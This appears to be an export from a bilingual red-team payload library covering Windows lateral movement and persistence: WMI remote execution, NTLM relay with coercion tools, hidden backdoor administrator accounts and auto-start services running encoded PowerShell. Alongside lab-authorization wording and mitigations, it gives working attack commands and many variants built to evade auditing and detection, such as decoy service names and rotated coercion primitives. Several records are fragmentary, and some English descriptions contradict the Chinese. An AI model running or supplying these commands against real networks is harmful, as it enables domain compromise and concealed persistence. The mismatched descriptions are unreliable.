description.zh: 先运行 $cred = Get-Credential {LAB_DOMAIN}\{LAB_USER} 构造凭据对象，再在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_WMI_E_4 与蓝队日志；成功时 Invoke-WmiMethod 返回 ReturnValue 0 且目标出现新进程。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_4 with blue-team logs; Invoke-WmiMethod returning ReturnValue 0 with a new process on the target confirms success.

analysis.zh: WMI 远程管理授权验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: WMI Remote-Management Authorization Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: WMI 执行无落盘但留 4688/5857 痕迹——保持单机单命令节奏，不对域控直接执行管理操作。
opsecTips.en: WMI execution leaves no file but 4688/5857 traces — keep a one-host one-command pace and never run management operations directly against domain controllers.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 wmic.exe 弃用遥测与进程链检测（wmic.exe→子进程特征）：用 PowerShell CIM 直连 WMI 服务。成功判据：进程创建成功且父进程非 wmic.exe。
description.en: Evades deprecated wmic.exe telemetry and process-chain detection (wmic.exe→child signature) by using PowerShell CIM to reach the WMI service directly. Success: process creation succeeds with a non-wmic parent.

title.zh: 事件订阅持久化规避变体

wafBypass.command: $filter=Set-WmiInstance -ComputerName {LAB_HOST} -Credential $cred -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SysHealth';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}; $consumer=Set-WmiInstance -ComputerName {LAB_HOST} -Credential $cred -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SysHealth';CommandLineTemplate='cmd /c whoami > C:\Windows\Temp\w.log'}; Set-WmiInstance -ComputerName {LAB_HOST} -Credential $cred -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}

description.zh: 绕过一次性 wmiexec 会话的 4648/进程创建告警：改用事件订阅延迟触发，无即时进程链关联。成功判据：60 秒内 w.log 生成且无即时父进程关联。
description.en: Evades one-shot wmiexec session alerts (4648/process creation) by switching to an event subscription that fires later with no immediate parent correlation. Success: w.log appears within 60s without an immediate parent chain.

title.zh: 共享输出回读规避变体

description.zh: 绕过 WMI 输出通道监控：结果重定向共享，规避 stdout 编码回传特征。成功判据：w.txt 含执行身份。
description.en: Evades WMI output-channel monitoring by redirecting results to a share instead of the encoded stdout return path. Success: w.txt contains the execution identity.

description.zh: 用 wmic /node:目标 process call create 启动回连命令；目标进程列表出现新进程即 WMI 远程执行可用且无文件落地。
description.en: Use wmic /node:target process call create to start a callback command; the new process appearing on the target shows WMI remote execution works without file drops.

title.en: Open an interactive channel with wmiexec

description.zh: 运行 wmiexec.py 以口令登录目标；返回管理员级半交互 shell 即建立稳定横向通道，可连续执行命令。
description.en: Run wmiexec.py with credentials; an admin-level semi-interactive shell establishes a stable lateral channel for continuous commands.

description.zh: 以 -hashes 方式重跑 wmiexec；同样拿到 shell 即 NTLM 哈希在 WMI 通道有效，可横向到仅握有哈希的主机。
description.en: Re-run wmiexec with -hashes; the same shell proves the NTLM hash works over WMI, extending reach to hash-only hosts.

title.en: Fan out with native PowerShell WMI

description.zh: 用 Invoke-WmiMethod 调 Win32_Process.Create 在域内批量下发命令；各目标返回 ProcessId 即完成无第三方二进制的批量横向。
description.en: Use Invoke-WmiMethod with Win32_Process.Create to fan commands across the domain; ProcessId returns from each target complete tool-free batch execution.

overview.zh: WMI 远程管理授权验证覆盖 DCOM/WMI 远程执行场景：针对持有凭据或哈希的测试主体，验证能否经 135 端口调用 Win32_Process 在目标创建进程。验证维度涵盖 wmic 单命令、wmiexec 交互 shell、哈希传递与 PowerShell 原生调用四种路径。
overview.en: WMI Remote-Management Authorization Validation covers DCOM/WMI remote execution: for a test principal holding credentials or a hash, verify whether Win32_Process can be invoked over port 135 to create a process on the target. Verification dimensions cover single-command wmic, an interactive wmiexec shell, pass-the-hash, and native PowerShell invocation.

vulnerability.zh: 根因是 WMI/DCOM 默认允许管理员组主体远程调用 Win32_Process.Create；口令弱化或哈希泄露后，攻击者无需向目标落盘任何工具即可拉起进程，行为混入正常 WMI 活动，检测依赖 4688 进程与 5857 WMI 活动事件关联。
vulnerability.en: The root cause is that WMI/DCOM by default lets administrators invoke Win32_Process.Create remotely; with weak passwords or leaked hashes, an attacker launches processes without dropping any tool on the target, and the activity blends into normal WMI traffic, making detection dependent on correlating 4688 process events with 5857 WMI activity.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 wmic 远程创建 cmd /c whoami 进程，返回 ReturnValue 0 与 ProcessId（命令输出需转存文件或共享取回）且目标侧出现 4688/5857 事件即确认成功；第 2 步进入 wmiexec 交互 shell 验证持续控制能力；第 3 步改用 -hashes 以 NTLM 哈希完成认证再取 shell；第 4 步先以 $cred = Get-Credential 构造凭据对象，再用 Invoke-WmiMethod 复现，ReturnValue 0 且目标出现新进程即确认。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 remotely creates a cmd /c whoami process with wmic — returned hostname output plus 4688/5857 events on the target confirms success; step 2 enters an interactive wmiexec shell to verify sustained control; step 3 switches to -hashes to authenticate with the NTLM hash and obtain a shell; step 4 replays with Invoke-WmiMethod — ReturnValue 0 plus a new process on the target confirms. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
WMI/DCOM 远程访问限制到管理网段与跳板机，收紧 WMI 命名空间与 DCOM 激活权限，监控 Win32_Process.Create 与 5857/4688 事件：
    New-NetFirewallRule -DisplayName "Block-RPC-WMI" -Direction Inbound -Action Block `
      -Protocol TCP -LocalPort 135 -RemoteAddress Any
    reg add HKLM\SOFTWARE\Microsoft\Ole /v EnableDCOM /t REG_SZ /d "N" /f   # 评估业务后禁用远程 DCOM
    AuditPol /set /subcategory:"Process Creation" /success:enable /failure:enable
    修复后用第 1、4 步样例回归，远程进程创建应返回拒绝错误。
mitigation.en: Restrict WMI/DCOM remote access to the management segment and jump hosts, tighten WMI namespace and DCOM launch permissions, and disable unnecessary remote WMI features; monitor Win32_Process.Create calls and 5857/4688 events. After the fix, regress with the step 1 and step 4 samples: remote process creation must return an access-denied error.

review.rationale: N-0020 C1/C4 回填 wmic 与 Invoke-WmiMethod 命令（=execution 步1/4）；N-0025 全步标记去重。

name.zh: NTLM Relay 协议边界验证

description.zh: 把捕获的 NTLM 认证中继到 SMB/HTTP/LDAP 目标，验证 SMB 签名与 EPA 配置的中继面。
description.en: Captures an NTLM authentication and relays it to SMB, HTTP, or LDAP targets, verifying that SMB signing and EPA channel binding actually block relay to each protocol.

prerequisites.zh: 确认 NTLM Relay 协议边界验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for NTLM Relay Protocol-Boundary Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

description.zh: 在隔离网段运行 Responder 捕获 NTLM 认证；成功时控制台打印捕获到的 SMB/HTTP NTLMv2 Hash 条目。
description.en: Run Responder in the isolated segment to capture NTLM authentication; the console printing captured SMB/HTTP NTLMv2 hash entries confirms success.

explanation.zh: -w 启用 WPAD 代理应答，-r 应答 wredir 后缀查询，-f 对发问主机做指纹识别（不存在 FTP 服务选项）
explanation.en: -w enables WPAD proxy answers, -r answers wredir suffix queries, and -f fingerprints querying hosts (there is no FTP service option)

title.zh: 中继认证枚举 SMB 可写
title.en: NTLM Relay Protocol-Boundary Validation Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_2 与蓝队日志；成功时 ntlmrelayx 打印转发认证成功记录并列出目标 SMB 可写状态。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_2 with blue-team logs; ntlmrelayx printing a successful relay record with target SMB status confirms success.

title.zh: 中继 LDAP 提升用户权限
title.en: NTLM Relay Protocol-Boundary Validation Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_3 与蓝队日志；成功时 --escalate-user 指定的现有用户在 LDAP 中获得提权 ACL/组成员变更，DC 事件 4662 记录目录对象修改。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_3 with blue-team logs; the escalated user appearing in LDAP with DC event 4662 recording the directory change confirms success.

title.zh: mitm6 劫持 DNS 中继 LDAPS
title.en: NTLM Relay Protocol-Boundary Validation Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_NTLM_RELAY_E_4 与蓝队日志；成功时 mitm6 应答 IPv6 DNS 且转发到域控的 LDAP 写入成功。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_NTLM_RELAY_E_4 with blue-team logs; mitm6 answering IPv6 DNS and the LDAP relay to the DC writing successfully confirms success.

analysis.zh: NTLM Relay 协议边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: NTLM Relay Protocol-Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 中继监听与强制认证只在隔离网段进行，不对生产夹具发起 coerced 认证；中继建立的会话验证后立即注销。
opsecTips.en: Run relay listeners and coerced authentications only on the isolated segment, never coerce production fixtures, and tear down relayed sessions immediately after verification.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: SOCKS 长驻低噪规避变体

description.zh: 绕过一次性转储触发的集中告警：中继凭证入 SOCKS 池供后续按需使用，减少批量 SAM 转储特征。成功判据：SOCKS 列表出现可用凭证且无即时转储行为。
description.en: Evades central alerting on one-shot dumps by parking relayed creds in a SOCKS pool for on-demand reuse, removing bulk SAM-dump signatures. Success: SOCKS list shows usable creds with no immediate dump.

title.zh: HTTP 目标多元规避变体

description.zh: 绕过 SMB 中继专用检测（针对 445 转储特征）：改经 HTTP 端口中继到多目标，流量形态为 Web。成功判据：多目标认证成功记录。
description.en: Evades SMB-relay-specific detection (445 dump signatures) by relaying over HTTP to multiple targets so traffic looks like web. Success: successful auth records for multiple targets.

title.zh: 强制认证源轮换规避变体

wafBypass.command: python3 petitpotam.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}; python3 printerbug.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASSWORD}@{LAB_HOST} {LAB_OPERATOR_HOST}; python3 dfscoerce.py -d {LAB_DOMAIN} -u {LAB_USER} -p {LAB_PASSWORD} {LAB_OPERATOR_HOST} {LAB_HOST}

description.zh: 绕过针对单一强制工具（如仅监控 PetitPotam CLSID）的检测：轮换 printerbug/dfscoerce 触发认证。成功判据：任一工具使目标回连操作机。
description.en: Evades detection pinned to a single coercion primitive (e.g. PetitPotam CLSID only) by rotating printerbug/dfscoerce to trigger auth. Success: any tool makes the target call back to the operator host.

title.zh: HTTP 端口伪装规避变体

description.zh: 绕过 445/3389 端口中继的定向监控：中继监听落在 80，流量呈现为普通 Web。成功判据：HTTP 目标认证成功入 SOCKS。
description.en: Evades directed monitoring of 445/3389 relaying by listening on port 80 so traffic looks like ordinary web. Success: HTTP target authenticates into SOCKS.

title.zh: PrinterBug 强制轮换规避变体

description.zh: 绕过 PetitPotam 特征（特定 CLSID/RPC UUID 监控）：换打印机通知回调触发认证。成功判据：目标向操作机发起认证。
description.en: Evades PetitPotam signatures (specific CLSID/RPC UUID monitoring) by triggering auth via the printer notification callback instead. Success: the target authenticates toward the operator host.

description.zh: 启动 Responder 监听 eth0 并开启 WPAD 等欺骗；控制台持续输出挑战响应即认证流量已被劫持捕获。
description.en: Start Responder on eth0 with WPAD poisoning; challenge-response lines streaming on the console mean authentication traffic is being captured.

title.zh: 中继认证到 SMB 目标

description.zh: 运行 ntlmrelayx.py -tf targets.txt -smb2support；目标回吐 SAM 哈希转储即认证中继成功，全程无需破解口令。
description.en: Run ntlmrelayx.py -tf targets.txt -smb2support; SAM hashes dumped from targets confirm the relay worked without cracking anything.

title.zh: 中继到 LDAP 提升域权限
title.en: Escalate in the domain via LDAP relay

description.zh: 把中继目标切到 ldap://DC 并加 --escalate-user；回显用户被加入高权限组或获得敏感 ACL 即完成域内提权。
description.en: Point the relay at ldap://DC with --escalate-user; the user landing in a privileged group or gaining a sensitive ACL completes domain escalation.

title.zh: IPv6 接管无人值守中继

description.zh: 用 mitm6 接管 DHCPv6 再中继到 LDAP；捕获机器账号认证并控制计算机对象即覆盖无 WPAD 的网段。
description.en: Take over DHCPv6 with mitm6 and relay into LDAP; machine-account captures with computer-object control extend reach to segments without WPAD.

overview.zh: NTLM Relay 协议边界验证覆盖认证中继场景：针对 SMB/LDAP 未强制签名或 EPA 的内网环境，验证能否把截获的 NTLM 认证转发到第三台主机完成越权操作。验证维度涵盖 Responder 捕获、SMB 中继、LDAP 中继提权与 IPv6 DNS 劫持组合四种路径。
overview.en: NTLM Relay Protocol-Boundary Validation covers authentication relaying: in intranets where SMB/LDAP do not enforce signing or EPA, verify whether captured NTLM authentication can be forwarded to a third host for unauthorized operations. Verification dimensions cover Responder capture, SMB relay, LDAP relay privilege escalation, and an IPv6 DNS hijack combination.

vulnerability.zh: 根因是 NTLM 认证不绑定目标服务，签名与通道绑定未强制时，攻击者可把受害者发出的认证原样转发给第三台主机并以其身份执行操作；中继到 LDAP 还能借 ACL 修改或 ADCS 注册直接提升为域级权限。
vulnerability.en: The root cause is that NTLM authentication is not bound to the target service; without enforced signing and channel binding, an attacker forwards the victim's authentication verbatim to a third host and acts as that identity; relaying into LDAP can even escalate to domain-level rights via ACL modification or ADCS enrollment.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在隔离网段运行 Responder 监听，控制台打印捕获的 NTLMv2 Hash 即确认认证可截获；第 2 步用 ntlmrelayx 中继到 SMB 目标，打印 RELAY 成功并列出目标可写共享；第 3 步中继到 LDAP 并 --escalate-user，目标账号获得提升且 DC 记录 4662 目录变更；第 4 步组合 mitm6 应答 IPv6 DNS，把 LDAP 写入送达域控。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 runs Responder on an isolated segment — printed NTLMv2 hashes confirm interception; step 2 relays to an SMB target with ntlmrelayx — RELAY success lines plus writable-share enumeration; step 3 relays into LDAP with --escalate-user — the account is escalated and the DC logs 4662 directory changes; step 4 pairs mitm6 answering IPv6 DNS to push the LDAP write through to the DC. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
全域强制 SMB/LDAP 签名与通道绑定，禁用不必要 NTLM 与 IPv6，对 DNS 变更与 4662 告警：
    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LDAPServerIntegrity /t REG_DWORD /d 2 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v LdapEnforceChannelBinding /t REG_DWORD /d 2 /f
    修复后用第 2、3 步回归，中继应被签名/通道绑定错误拒绝。
mitigation.en: Enforce SMB signing, LDAP signing, and channel binding (EPA) domain-wide; disable NTLM or confine it to protected channels, disable unnecessary IPv6 with alerts on DNS record changes, and monitor 4662 directory changes and abnormal auth chains. After the fix, regress with the step 2 and step 3 samples: relays must be rejected with signing/channel-binding errors.

review.rationale: N-0020 C3 回填 ntlmrelayx LDAP --escalate-user 提权命令（=execution 步3；b2 仅处理 wafBypass，链空串仍缺）。

name.zh: 异常本地账号持久化审计

description.zh: 创建本地后门账户并提升至管理员组，含 $ 后缀隐藏账户与 SAM 注册表登记，验证账户形态驻留与检测面。
description.en: Create local backdoor accounts and elevate them into the administrators group, including $-suffix hidden accounts and SAM registry persistence, verifying account-form residency and detection surface.

prerequisites.zh: 确认 异常本地账号持久化审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Anomalous Local-Account Persistence Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

execution.command:
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add

description.zh: 创建账户并加入管理员组；net user 回读账户存在且属于管理员组，即确认后门账户建立。
description.en: Create the account and add it to Administrators; net user showing the account in Administrators confirms the backdoor account.

description.zh: 创建 $ 结尾账户；常规 net user 列表不可见但按名查询可返回，即确认隐藏账户特性。
description.en: Create the $-suffixed account; invisible in routine net user listings yet queryable by name confirms the hidden-account trait.

description.zh: 判据: 需以 SYSTEM 上下文操作（默认管理员无权访问 SAM 键，可经 psexec -s 等提升）；reg query 回读 Names\backdoor$ 或 reg export 成功导出该键，即确认账户键在注册表层可独立读写，验证注册表层面的隐藏固化机制。
description.en: Export/import the account key to verify SAM behavior; the Names key being independently operable demonstrates registry-level hiding.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 net.exe 命令行审计：cmdlet 建号并入组；本地用户清单出现即成功。
description.en: Create and group the account via cmdlets to avoid net.exe command-line auditing; the account appearing in local users confirms success.

description.zh: 以目录服务接口替代命令行工具：无 net.exe 进程痕迹；ADSI 查询可见新号即成功。
description.en: Create the account through the directory interface with no net.exe process; the new account visible via ADSI confirms success.

wafBypass.command: net user svc_backup P@ssw0rd /add /y & net user svc_backup /comment:"Windows backup service account" & net localgroup administrators svc_backup /add

description.zh: 以服务风格命名加描述降低目视与清单告警；注释生效且入组即成功。
description.en: A service-style name and comment lower inventory alerts; the comment applied plus group membership confirms success.

description.zh: 在账号已建基础上写登录界面隐藏键：net user 枚举仍可见但登录屏不可见；键值存在且登录屏无该账号即成功。
description.en: Write the logon-screen hiding key after account creation; the value present with the account absent from the logon UI confirms success.

description.zh: cmdlet 建号并同步写隐藏键规避 net.exe 审计；用户清单含号但登录屏不显示即成功。
description.en: Create and hide via cmdlets avoiding net.exe auditing; listed in inventory yet hidden at the logon screen confirms success.

description.zh: 以目录命令在域内建 $ 后缀账号并伪装描述；AD 用户对象出现即成功。
description.en: Create the $-suffixed domain account with a decoy description via dsadd; the AD user object appearing confirms success.

description.zh: 创建 $ 结尾用户；命令成功返回即创建完成，账户默认对常规枚举不可见。
description.en: Create the $-suffixed user; a success return means creation completed and the account is hidden from routine enumeration.

description.zh: 将其加入管理员组；net localgroup administrators 输出包含该账户即提权到位。
description.en: Add it to Administrators; the account appearing in net localgroup administrators confirms the privilege grant.

title.zh: 导出并回放 SAM 注册表键
title.en: Export and replay the SAM registry key

wafBypass.command:
reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
reg import user.reg

description.zh: 导出隐藏账号对应的 SAM 注册表项并回导入本机，观察注册表层面的账号隐藏痕迹。
description.en: Exports the SAM registry key for the hidden account and re-imports it locally to observe registry-level account-hiding artifacts.

description.zh: 用 net user 添加 backdoor 账户并加入管理员组；回读显示账户存在且在组内即获得持久的提权登录入口。
description.en: Add the backdoor user with net user and drop it into administrators; a readback confirming membership yields a durable privileged login.

attackChain.payload:
net user backdoor P@ssw0rd /add
net localgroup administrators backdoor /add

description.zh: 创建以美元符结尾的 backdoor 账户；常规 net user 枚举不显示而按名查询可返回，即对日常巡检实现隐身。
description.en: Create the dollar-suffixed account; ordinary net user listings skip it while direct name queries resolve it, hiding it from casual review.

title.en: Reinforce hiding at the registry layer

description.zh: 直接操作 SAM 注册表的 Names 键核对账户项；键可独立读写即把隐藏机制下沉到注册表层面，进一步规避面板与清单检测。
description.en: Manipulate the SAM Names key for the account directly; registry-level control pushes the hiding below what panels and user lists can see.

overview.zh: 该 Payload 覆盖异常本地账号持久化审计场景，检验管理员组成员的创建路径与隐藏手段。验证维度含常规后门账号、美元后缀隐藏账号与注册表层隐藏三类机制，对应第 1 至第 3 步。
overview.en: This payload covers anomalous local-account persistence auditing, testing creation paths and hiding tricks for Administrators members. Validation covers a regular backdoor account, a dollar-suffixed hidden account and registry-level hiding, mapped to steps 1 through 3.

vulnerability.zh: 根因在于本地账号与组成员管理缺少变更基线：常规巡检只看可见账号列表，美元后缀或注册表键操作即可让账号逃逸枚举，长期保留管理员权限。
vulnerability.en: The root cause is local-account and group-membership management lacking change baselines: routine reviews read only the visible account list, so dollar suffixes or registry-key tricks keep hidden accounts with standing admin rights out of enumeration.

exploitation.zh: 第 1 步创建测试账号并加入管理员组，回读成员列表确认权限到位；第 2 步创建美元后缀账号，验证常规 net user 列表不可见而按名查询可返回；第 3 步操作 SAM Names 注册表键核对注册表层面的隐藏机制与 F 值关联。每步以回读结果为成功判据。占位符在全局变量菜单替换；测试完成后立即删除全部测试账号并导出前后对比。
exploitation.en: In step 1, create a test account, add it to Administrators, and read back membership to confirm privileges. In step 2, create a dollar-suffixed account and verify it is invisible in normal net user listings yet resolvable by name. In step 3, operate the SAM Names registry key to inspect registry-level hiding and F-value linkage. Judge success by read-back results per step. Replace placeholders via the global variables menu; delete all test accounts afterwards and export before/after comparisons.

mitigation.zh:
基线监控本地账号与管理组变更事件（4720/4732），比对注册表 Names 键识破美元后缀隐藏账号：
    auditpol /set /subcategory:"User Account Management" /success /failure
    auditpol /set /subcategory:"Security Group Management" /success /failure
    Get-LocalUser | Select Name, Enabled | Export-Csv C:\baseline\users.csv
    reg query "HKLM\SAM\SAM\Domains\Account\Users\Names"
mitigation.en: Baseline-monitor local-account and group-membership changes (4720, 4732), diff host versus domain account lists, and inspect registry Names keys. After the fix, replay steps 1 and 2: creation and group additions should alert instantly.

analysis.zh: 异常本地账号持久化审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Anomalous Local-Account Persistence Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

review.rationale: N-0020 C3 回填 SAM 注册表 Names 键固化命令（=execution 步3）。

description.zh: 审计服务 binpath 与恢复动作配置，验证服务形态的持久化滥用。
description.en: Registers a service whose binPath points at a script interpreter and configures failure-recovery actions, giving attacker code both boot-start and crash-restart triggers with higher stealth than startup folders.

prerequisites.zh: 确认 服务持久化配置审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Service Persistence Configuration Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

execution.command: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

description.zh: 用 sc create 注册开机自启的 evilsvc 服务，其 binPath 以 Base64 解码命令启动 PowerShell。
description.en: Registers the evilsvc service with sc create for auto start; its binPath launches PowerShell with the Base64-decoded command.

description.zh: 启动服务触发载荷；载荷命令执行即确认服务持久化触发成功。binPath 为 cmd /c 包装时进程随即退出，SCM 报错或显示停止属预期，不影响载荷已执行。
description.en: Start the service to fire the payload; sc query showing RUNNING with the payload command executed confirms the trigger.

opsecTips.zh: 服务持久化配置在重启后生效——验证后立即删除测试服务并核对 binPath 还原；不在域控或生产节点验证。
opsecTips.en: Service persistence takes effect after reboot — delete the test service and confirm binPath restoration immediately after verification, and never validate on domain controllers or production nodes.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command: powershell -NoProfile -Command "New-Service -Name 'SysUpdate' -BinaryPathName 'cmd /c powershell -e {LAB_BASE64_COMMAND}' -StartupType Automatic -Description 'Windows system update helper'"

description.zh: 规避 sc.exe 命令行审计并以描述伪装：服务创建成功且自启动即驻留生效。
description.en: Create the service via PowerShell with a decoy description past sc.exe auditing; creation with automatic startup confirms persistence.

title.zh: 现有服务 ImagePath 劫持

description.zh: 不新建对象只改既有服务路径：绕过新增服务审计；服务重启后执行载荷即成功。
description.en: Modify an existing service's ImagePath instead of creating one, evading new-object auditing; the payload running on service restart confirms success.

wafBypass.command: sc create "WindowsRemoteManagementUpdater" binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto DisplayName= "Windows Remote Management Updater"

description.zh: 系统风格长名与显示名降低运维目视告警；服务列表出现且 start= auto 即成功。
description.en: A system-style long name lowers visual triage alerts; the service listed with automatic start confirms success.

description.zh: 把要常驻执行的命令编码为 Base64 形态并验证可独立运行；确定为服务 binPath 的最终载荷，避免命令行特殊字符引发解析问题。
description.en: Base64-encode the resident command and verify it executes standalone; fixing the final binPath payload early avoids parsing surprises in service control.

attackChain.payload: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

description.zh: 用 sc create 注册 auto 启动类型的服务，binPath 指向 Base64 编码命令；服务创建成功即写入系统级自启配置，等待开机加载。
description.en: Register an auto-start service with sc create whose binPath runs a Base64 command; creation writes the system-level autostart entry awaiting boot.

attackChain.payload: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

title.en: Start the service to verify firing

description.zh: 用 sc start 启动服务；载荷命令执行即确认持久化生效（cmd /c 包装的 binPath 不维持 RUNNING，SCM 报终止属预期），系统重启后仍会自动加载执行。
description.en: Start it with sc start; RUNNING status plus the encoded command executing proves persistence that survives reboots.

overview.zh: 该 Payload 覆盖服务持久化配置审计场景，检验自启服务创建与启动触发的完整链路。验证维度含 Base64 载荷服务注册与启动执行两步，对应第 1 至第 2 步。
overview.en: This payload covers service-persistence configuration auditing, testing the full chain of autostart service creation and launch triggering. Validation covers registering a Base64-payload service and start execution, mapped to steps 1 and 2.

vulnerability.zh: 根因在于服务注册默认要求管理员但常被滥用为合法变更：指向脚本解释器的 binPath 获得开机自启与失败重启的双重触发，隐蔽性高于启动目录。
vulnerability.en: The root cause is service registration requiring administrator yet frequently abused as legitimate change: a binPath pointing at script interpreters gains both boot-start and failure-restart triggers, hiding better than startup folders.

exploitation.zh: 第 1 步用 sc create 注册自启服务 evilsvc，binPath 指向 Base64 解码命令，qc 回读确认创建成功；第 2 步以 sc start 触发执行，载荷命令执行即确认持久化链路完整（cmd /c 包装的服务不会维持 RUNNING，以载荷执行痕迹为准）。以执行痕迹与开机自动加载为成功判据。占位符在全局变量菜单替换；测试后 sc delete 清理服务。
exploitation.en: In step 1, register autostart service evilsvc with sc create, pointing binPath at a Base64-decoded command, and confirm creation via qc read-back. In step 2, trigger execution with sc start; RUNNING status plus payload execution confirms the persistence chain. Judge success by execution traces and service state. Replace placeholders via the global variables menu; clean up with sc delete after testing.

mitigation.zh:
服务创建/变更事件（7045/7040）默认记录，重点在实时告警与基线比对，并约束管理员执行来源：
    Get-WinEvent -FilterHashtable @{LogName='System';Id=7045,7040} -MaxEvents 50 | Select TimeCreated, Message
    Get-Service | Select Name, Status, StartType | Export-Csv C:\baseline\services.csv -NoTypeInformation
mitigation.en: Enable event auditing for service creation and changes (7045, 7040), diff service inventories against baselines, and constrain administrator execution sources. After the fix, replay step 1: registration should alert instantly and enter approval workflow.

analysis.zh: 服务持久化配置审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
